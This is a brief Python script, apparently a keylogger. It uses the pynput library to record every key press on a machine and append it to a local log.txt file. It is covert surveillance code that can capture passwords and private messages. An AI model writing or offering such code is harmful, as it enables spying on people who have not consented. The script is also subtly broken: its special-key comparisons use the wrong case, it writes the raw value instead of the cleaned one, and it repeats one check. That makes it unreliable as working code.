from pynput.keyboard import Listener

def writetofile(key):
    keydata=str(key)
    letter=keydata.replace("'","")
    if keydata == 'key.space':
        keydata=' '
    if keydata == 'key.enter':
        keydata='\n'
    if keydata == 'key.ctrl_l':
        keydata=''
    
    if keydata == 'key.ctrl_r':
        keydata=''
    
    if keydata == 'key.shift_l':
        keydata=''
    
    if keydata == 'key.shift_l':
        keydata=''
    if keydata == 'key.tab':
        keydata='   '
    
    
    with open("log.txt",'a') as f:
        f.write(letter)
with Listener(on_press=writetofile) as l:
    l.join()